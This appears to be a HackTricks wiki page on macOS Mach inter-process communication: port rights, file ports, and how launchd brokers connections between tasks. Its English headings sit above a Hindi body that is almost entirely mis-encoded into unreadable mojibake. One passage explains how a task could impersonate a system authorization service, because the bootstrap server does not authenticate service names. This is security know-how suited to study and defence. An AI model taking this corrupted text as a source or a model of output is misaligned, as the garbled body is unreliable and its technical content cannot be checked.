# macOS IPC - Inter Process Communication

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Mach messaging via Ports

### Basic Information

Mach **рдХрд╛рд░реНрдп** рдХреЛ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд╕рдмрд╕реЗ рдЫреЛрдЯреЗ рдЗрдХрд╛рдИ** рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдкреНрд░рддреНрдпреЗрдХ рдХрд╛рд░реНрдп рдореЗрдВ **рдХрдИ рдереНрд░реЗрдб** рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдпреЗ **рдХрд╛рд░реНрдп рдФрд░ рдереНрд░реЗрдб POSIX рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдФрд░ рдереНрд░реЗрдбреНрд╕ рдХреЗ рд▓рд┐рдП 1:1 рдореИрдк рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ**ред

рдХрд╛рд░реНрдп рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ Mach рдЗрдВрдЯрд░-рдкреНрд░реЛрд╕реЗрд╕ рд╕рдВрдЪрд╛рд░ (IPC) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдПрдХрддрд░рдлрд╛ рд╕рдВрдЪрд╛рд░ рдЪреИрдирд▓реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред **рд╕рдВрджреЗрд╢ рдкреЛрд░реНрдЯ рдХреЗ рдмреАрдЪ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рд╣реЛрддреЗ рд╣реИрдВ**, рдЬреЛ рдХрд░реНрдиреЗрд▓ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдмрдВрдзрд┐рдд **рд╕рдВрджреЗрд╢ рдХрддрд╛рд░реЛрдВ** рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддреЗ рд╣реИрдВред

рдПрдХ **рдкреЛрд░реНрдЯ** Mach IPC рдХрд╛ **рдмреБрдирд┐рдпрд╛рджреА** рддрддреНрд╡ рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдПрдХ **IPC рддрд╛рд▓рд┐рдХрд╛** рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ **mach рдкреЛрд░реНрдЯ** рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВред рдПрдХ mach рдкреЛрд░реНрдЯ рдХрд╛ рдирд╛рдо рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдПрдХ рд╕рдВрдЦреНрдпрд╛ рд╣реИ (рдХрд░реНрдиреЗрд▓ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреЙрдЗрдВрдЯрд░)ред

рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдПрдХ рдкреЛрд░реНрдЯ рдирд╛рдо рдХреБрдЫ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде **рдПрдХ рдЕрд▓рдЧ рдХрд╛рд░реНрдп** рдХреЛ рднреА рднреЗрдЬ рд╕рдХрддреА рд╣реИ рдФрд░ рдХрд░реНрдиреЗрд▓ рдЗрд╕ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЛ **рджреВрд╕рд░реЗ рдХрд╛рд░реНрдп рдХреА IPC рддрд╛рд▓рд┐рдХрд╛** рдореЗрдВ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░реЗрдЧрд╛ред

### Port Rights

рдкреЛрд░реНрдЯ рдЕрдзрд┐рдХрд╛рд░, рдЬреЛ рдпрд╣ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдХрд╛рд░реНрдп рдХреМрди рд╕реЗ рд╕рдВрдЪрд╛рд▓рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕ рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рдХреБрдВрдЬреА рд╣реИрдВред рд╕рдВрднрд╛рд╡рд┐рдд **рдкреЛрд░реНрдЯ рдЕрдзрд┐рдХрд╛рд░** рд╣реИрдВ ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **рдкреНрд░рд╛рдкреНрддрд┐ рдЕрдзрд┐рдХрд╛рд░**, рдЬреЛ рдкреЛрд░реНрдЯ рдкрд░ рднреЗрдЬреЗ рдЧрдП рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред Mach рдкреЛрд░реНрдЯ MPSC (multiple-producer, single-consumer) рдХрддрд╛рд░реЗрдВ рд╣реИрдВ, рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдкреВрд░реЗ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ **рдкреНрд░рддреНрдпреЗрдХ рдкреЛрд░реНрдЯ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ рдПрдХ рдкреНрд░рд╛рдкреНрддрд┐ рдЕрдзрд┐рдХрд╛рд░** рд╣реЛ рд╕рдХрддрд╛ рд╣реИ (рдкрд╛рдЗрдк рдХреЗ рд╡рд┐рдкрд░реАрдд, рдЬрд╣рд╛рдВ рдХрдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рдПрдХ рдкрд╛рдЗрдк рдХреЗ рдкрдврд╝рдиреЗ рдХреЗ рдЕрдВрдд рдХреЗ рд▓рд┐рдП рдлрд╝рд╛рдЗрд▓ рд╡рд░реНрдгрдирдХрд░реНрддрд╛ рд░рдЦ рд╕рдХрддреА рд╣реИрдВ)ред
* рдПрдХ **рдХрд╛рд░реНрдп рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рдкреНрд░рд╛рдкреНрддрд┐** рдЕрдзрд┐рдХрд╛рд░ рд╣реИ, рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рднреЗрдЬрдиреЗ рдХреЗ рдЕрдзрд┐рдХрд╛рд░** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЗрд╕реЗ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред рдореВрд▓ рд░реВрдк рд╕реЗ рдХреЗрд╡рд▓ **рд╕реНрд╡рдпрдВ рдХрд╛рд░реНрдп рдХреЗ рдкрд╛рд╕ рдЕрдкрдиреЗ рдкреЛрд░реНрдЯ рдкрд░ рдкреНрд░рд╛рдкреНрддрд┐ рдЕрдзрд┐рдХрд╛рд░** рд╣реЛрддрд╛ рд╣реИред
* рдпрджрд┐ рдкреНрд░рд╛рдкреНрддрд┐ рдЕрдзрд┐рдХрд╛рд░ рдХрд╛ рдорд╛рд▓рд┐рдХ **рдорд░ рдЬрд╛рддрд╛ рд╣реИ** рдпрд╛ рдЗрд╕реЗ рдорд╛рд░рддрд╛ рд╣реИ, рддреЛ **рднреЗрдЬрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рдмреЗрдХрд╛рд░ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ (рдореГрдд рдирд╛рдо)ред**
* **рднреЗрдЬрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░**, рдЬреЛ рдкреЛрд░реНрдЯ рдкрд░ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
* рднреЗрдЬрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ **рдХреНрд▓реЛрди** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдПрдХ рдХрд╛рд░реНрдп рдЬреЛ рднреЗрдЬрдиреЗ рдХреЗ рдЕрдзрд┐рдХрд╛рд░ рдХрд╛ рдорд╛рд▓рд┐рдХ рд╣реИ, рдЕрдзрд┐рдХрд╛рд░ рдХреЛ рдХреНрд▓реЛрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рдЗрд╕реЗ рддреАрд╕рд░реЗ рдХрд╛рд░реНрдп рдХреЛ рджреЗ рд╕рдХрддрд╛ рд╣реИ**ред
* рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдкреЛрд░реНрдЯ рдЕрдзрд┐рдХрд╛рд░** рдХреЛ Mac рд╕рдВрджреЗрд╢реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреА **рдмреАрддрд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **рдПрдХ рдмрд╛рд░ рднреЗрдЬрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░**, рдЬреЛ рдкреЛрд░реНрдЯ рдкрд░ рдПрдХ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЧрд╛рдпрдм рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред
* рдпрд╣ рдЕрдзрд┐рдХрд╛рд░ **рдХреНрд▓реЛрди** рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛, рд▓реЗрдХрд┐рди рдЗрд╕реЗ **рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **рдкреЛрд░реНрдЯ рд╕реЗрдЯ рдЕрдзрд┐рдХрд╛рд░**, рдЬреЛ рдПрдХ _рдкреЛрд░реНрдЯ рд╕реЗрдЯ_ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рди рдХрд┐ рдПрдХрд▓ рдкреЛрд░реНрдЯред рдПрдХ рдкреЛрд░реНрдЯ рд╕реЗрдЯ рд╕реЗ рд╕рдВрджреЗрд╢ рдХреЛ рдбреАрдХреНрдпреВ рдХрд░рдиреЗ рд╕реЗ рдЙрд╕ рдкреЛрд░реНрдЯ рдореЗрдВ рд╕реЗ рдПрдХ рд╕рдВрджреЗрд╢ рдбреАрдХреНрдпреВ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдпрд╣ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИред рдкреЛрд░реНрдЯ рд╕реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рд╕рд╛рде рдХрдИ рдкреЛрд░реНрдЯ рдкрд░ рд╕реБрдирдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ Unix рдореЗрдВ `select`/`poll`/`epoll`/`kqueue`ред
* **рдореГрдд рдирд╛рдо**, рдЬреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкреЛрд░реНрдЯ рдЕрдзрд┐рдХрд╛рд░ рдирд╣реАрдВ рд╣реИ, рдмрд▓реНрдХрд┐ рдХреЗрд╡рд▓ рдПрдХ рдкреНрд▓реЗрд╕рд╣реЛрд▓реНрдбрд░ рд╣реИред рдЬрдм рдПрдХ рдкреЛрд░реНрдЯ рдирд╖реНрдЯ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдкреЛрд░реНрдЯ рдХреЗ рд▓рд┐рдП рд╕рднреА рдореМрдЬреВрджрд╛ рдкреЛрд░реНрдЯ рдЕрдзрд┐рдХрд╛рд░ рдореГрдд рдирд╛рдореЛрдВ рдореЗрдВ рдмрджрд▓ рдЬрд╛рддреЗ рд╣реИрдВред

**рдХрд╛рд░реНрдп SEND рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рджреВрд╕рд░реЛрдВ рдХреЛ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдЬрд┐рд╕рд╕реЗ рдЙрдиреНрд╣реЗрдВ рд╕рдВрджреЗрд╢ рд╡рд╛рдкрд╕ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред **SEND рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рднреА рдХреНрд▓реЛрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдПрдХ рдХрд╛рд░реНрдп рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рддреАрд╕рд░реЗ рдХрд╛рд░реНрдп рдХреЛ рдЕрдзрд┐рдХрд╛рд░ рджреЗ рд╕рдХрддрд╛ рд╣реИ**ред рдпрд╣, рдПрдХ рдордзреНрдпрд╡рд░реНрддреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕рд╛рде рдорд┐рд▓рдХрд░ рдЬрд┐рд╕реЗ **рдмреВрдЯрд╕реНрдЯреНрд░реИрдк рд╕рд░реНрд╡рд░** рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рдмреАрдЪ рдкреНрд░рднрд╛рд╡реА рд╕рдВрдЪрд╛рд░ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

### File Ports

рдлрд╛рдЗрд▓ рдкреЛрд░реНрдЯреНрд╕ Mac рдкреЛрд░реНрдЯреНрд╕ рдореЗрдВ рдлрд╝рд╛рдЗрд▓ рд╡рд░реНрдгрдирдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕рдВрд▓рдЧреНрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ (Mach рдкреЛрд░реНрдЯ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ)ред рдПрдХ рджрд┐рдП рдЧрдП FD рд╕реЗ `fileport_makeport` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ `fileport` рдмрдирд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдФрд░ рдПрдХ fileport рд╕реЗ FD рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП `fileport_makefd` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

### Establishing a communication

рдЬреИрд╕рд╛ рдХрд┐ рдкрд╣рд▓реЗ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, Mach рд╕рдВрджреЗрд╢реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдзрд┐рдХрд╛рд░ рднреЗрдЬрдирд╛ рд╕рдВрднрд╡ рд╣реИ, рд╣рд╛рд▓рд╛рдБрдХрд┐, рдЖрдк **рдПрдХ рдЕрдзрд┐рдХрд╛рд░ рдирд╣реАрдВ рднреЗрдЬ рд╕рдХрддреЗ рдмрд┐рдирд╛ рдкрд╣рд▓реЗ рд╕реЗ рдПрдХ рдЕрдзрд┐рдХрд╛рд░** рд╣реЛрдиреЗ рдХреЗред рддреЛ, рдкрд╣рд▓рд╛ рд╕рдВрдЪрд╛рд░ рдХреИрд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ?

рдЗрд╕рдХреЗ рд▓рд┐рдП, **рдмреВрдЯрд╕реНрдЯреНрд░реИрдк рд╕рд░реНрд╡рд░** (**launchd** in mac) рд╢рд╛рдорд┐рд▓ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ **рдХреЛрдИ рднреА рдмреВрдЯрд╕реНрдЯреНрд░реИрдк рд╕рд░реНрд╡рд░ рдХреЛ SEND рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ**, рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЗрд╕реЗ рдХрд┐рд╕реА рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХрд╛рд░ рдорд╛рдВрдЧрд╛ рдЬрд╛рдП:

1. рдХрд╛рд░реНрдп **A** рдПрдХ **рдирдпрд╛ рдкреЛрд░реНрдЯ** рдмрдирд╛рддрд╛ рд╣реИ, рдЙрд╕ рдкрд░ **рдкреНрд░рд╛рдкреНрддрд┐ рдЕрдзрд┐рдХрд╛рд░** рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред
2. рдХрд╛рд░реНрдп **A**, рдЬреЛ рдкреНрд░рд╛рдкреНрддрд┐ рдЕрдзрд┐рдХрд╛рд░ рдХрд╛ рдзрд╛рд░рдХ рд╣реИ, **рдкреЛрд░реНрдЯ рдХреЗ рд▓рд┐рдП рдПрдХ SEND рдЕрдзрд┐рдХрд╛рд░ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ**ред
3. рдХрд╛рд░реНрдп **A** **рдмреВрдЯрд╕реНрдЯреНрд░реИрдк рд╕рд░реНрд╡рд░** рдХреЗ рд╕рд╛рде рдПрдХ **рд╕рдВрдпреЛрдЧ** рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдФрд░ **рдЙрд╕реЗ рдкреЛрд░реНрдЯ рдХреЗ рд▓рд┐рдП SEND рдЕрдзрд┐рдХрд╛рд░ рднреЗрдЬрддрд╛ рд╣реИ** рдЬрд┐рд╕реЗ рдЙрд╕рдиреЗ рд╢реБрд░реБрдЖрдд рдореЗрдВ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдерд╛ред
* рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдХреЛрдИ рднреА рдмреВрдЯрд╕реНрдЯреНрд░реИрдк рд╕рд░реНрд╡рд░ рдХреЛ SEND рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред
4. рдХрд╛рд░реНрдп A рдмреВрдЯрд╕реНрдЯреНрд░реИрдк рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ `bootstrap_register` рд╕рдВрджреЗрд╢ рднреЗрдЬрддрд╛ рд╣реИ рддрд╛рдХрд┐ **рджрд┐рдП рдЧрдП рдкреЛрд░реНрдЯ рдХреЛ рдПрдХ рдирд╛рдо рд╕реЗ рдЬреЛрдбрд╝ рд╕рдХреЗ** рдЬреИрд╕реЗ `com.apple.taska`
5. рдХрд╛рд░реНрдп **B** **рдмреВрдЯрд╕реНрдЯреНрд░реИрдк рд╕рд░реНрд╡рд░** рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕реЗрд╡рд╛ рдирд╛рдо рдХреЗ рд▓рд┐рдП рдмреВрдЯрд╕реНрдЯреНрд░реИрдк **рд▓реБрдХрдЕрдк** рдХрд░ рд╕рдХреЗ (`bootstrap_lookup`)ред рддрд╛рдХрд┐ рдмреВрдЯрд╕реНрдЯреНрд░реИрдк рд╕рд░реНрд╡рд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗ рд╕рдХреЗ, рдХрд╛рд░реНрдп B рдЗрд╕реЗ рдПрдХ **SEND рдЕрдзрд┐рдХрд╛рд░** рднреЗрдЬреЗрдЧрд╛ рдЬрд┐рд╕реЗ рдЙрд╕рдиреЗ рдкрд╣рд▓реЗ рд▓реБрдХрдЕрдк рд╕рдВрджреЗрд╢ рдХреЗ рднреАрддрд░ рдмрдирд╛рдпрд╛ рдерд╛ред рдпрджрд┐ рд▓реБрдХрдЕрдк рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ, рддреЛ **рд╕рд░реНрд╡рд░ SEND рдЕрдзрд┐рдХрд╛рд░ рдХреЛ рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдХрд░рддрд╛ рд╣реИ** рдЬреЛ рдХрд╛рд░реНрдп A рд╕реЗ рдкреНрд░рд╛рдкреНрдд рд╣реБрдЖ рдФрд░ **рдЗрд╕реЗ рдХрд╛рд░реНрдп B рдХреЛ рд╕рдВрдкреНрд░реЗрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ**ред
* рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдХреЛрдИ рднреА рдмреВрдЯрд╕реНрдЯреНрд░реИрдк рд╕рд░реНрд╡рд░ рдХреЛ SEND рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред
6. рдЗрд╕ SEND рдЕрдзрд┐рдХрд╛рд░ рдХреЗ рд╕рд╛рде, **рдХрд╛рд░реНрдп B** **рдХрд╛рд░реНрдп A** рдХреЛ **рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ**ред
7. рджреНрд╡рд┐рджрд┐рд╢реАрдп рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рдЖрдорддреМрд░ рдкрд░ рдХрд╛рд░реНрдп **B** рдПрдХ **рдкреНрд░рд╛рдкреНрддрд┐** рдЕрдзрд┐рдХрд╛рд░ рдФрд░ рдПрдХ **SEND** рдЕрдзрд┐рдХрд╛рд░ рдХреЗ рд╕рд╛рде рдПрдХ рдирдпрд╛ рдкреЛрд░реНрдЯ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ, рдФрд░ **SEND рдЕрдзрд┐рдХрд╛рд░ рдХрд╛рд░реНрдп A рдХреЛ рджреЗрддрд╛ рд╣реИ** рддрд╛рдХрд┐ рд╡рд╣ рдХрд╛рд░реНрдп B рдХреЛ рд╕рдВрджреЗрд╢ рднреЗрдЬ рд╕рдХреЗ (рджреНрд╡рд┐рджрд┐рд╢реАрдп рд╕рдВрдЪрд╛рд░)ред

рдмреВрдЯрд╕реНрдЯреНрд░реИрдк рд╕рд░реНрд╡рд░ **рд╕реЗрд╡рд╛ рдирд╛рдо** рдХрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рдЬреЛ рдПрдХ рдХрд╛рд░реНрдп рджреНрд╡рд╛рд░рд╛ рджрд╛рд╡рд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ **рдХрд╛рд░реНрдп** рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ **рдХрд┐рд╕реА рднреА рд╕рд┐рд╕реНрдЯрдо рдХрд╛рд░реНрдп рдХрд╛ рдЕрдиреБрдХрд░рдг** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдЭреВрдард╛ **рдкреНрд░рд╛рдзрд┐рдХрд░рдг рд╕реЗрд╡рд╛ рдирд╛рдо рдХрд╛ рджрд╛рд╡рд╛ рдХрд░рдирд╛** рдФрд░ рдлрд┐рд░ рд╣рд░ рдЕрдиреБрд░реЛрдз рдХреЛ рдордВрдЬреВрд░реА рджреЗрдирд╛ред

рдлрд┐рд░, Apple **рд╕рд┐рд╕реНрдЯрдо-рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдирд╛рдо** рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддрд╛ рд╣реИ, рдЬреЛ **SIP-рд╕реБрд░рдХреНрд╖рд┐рдд** рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИрдВ: `/System/Library/LaunchDaemons` рдФрд░ `/System/Library/LaunchAgents`ред рдкреНрд░рддреНрдпреЗрдХ рд╕реЗрд╡рд╛ рдирд╛рдо рдХреЗ рд╕рд╛рде, **рд╕рдВрдмрдВрдзрд┐рдд рдмрд╛рдЗрдирд░реА рднреА рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИ**ред рдмреВрдЯрд╕реНрдЯреНрд░реИрдк рд╕рд░реНрд╡рд░, рдЗрди рд╕реЗрд╡рд╛ рдирд╛рдореЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ **рдкреНрд░рд╛рдкреНрддрд┐ рдЕрдзрд┐рдХрд╛рд░ рдмрдирд╛рдПрдЧрд╛ рдФрд░ рд░рдЦреЗрдЧрд╛**ред

рдЗрди рдкреВрд░реНрд╡рдирд┐рд░реНрдзрд╛рд░рд┐рдд рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП, **рд▓реБрдХрдЕрдк рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдереЛрдбрд╝реА рднрд┐рдиреНрди рд╣реЛрддреА рд╣реИ**ред рдЬрдм рдПрдХ рд╕реЗрд╡рд╛ рдирд╛рдо рдХреА рдЦреЛрдЬ рдХреА рдЬрд╛ рд░рд╣реА рд╣реЛрддреА рд╣реИ, рддреЛ launchd рд╕реЗрд╡рд╛ рдХреЛ рдЧрддрд┐рд╢реАрд▓ рд░реВрдк рд╕реЗ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИред рдирдпрд╛ рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╣реИ:

* рдХрд╛рд░реНрдп **B** рдПрдХ рд╕реЗрд╡рд╛ рдирд╛рдо рдХреЗ рд▓рд┐рдП рдмреВрдЯрд╕реНрдЯреНрд░реИрдк **рд▓реБрдХрдЕрдк** рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИред
* **launchd** рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рдХрд╛рд░реНрдп рдЪрд▓ рд░рд╣рд╛ рд╣реИ рдФрд░ рдпрджрд┐ рдирд╣реАрдВ рд╣реИ, рддреЛ **рдЗрд╕реЗ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ**ред
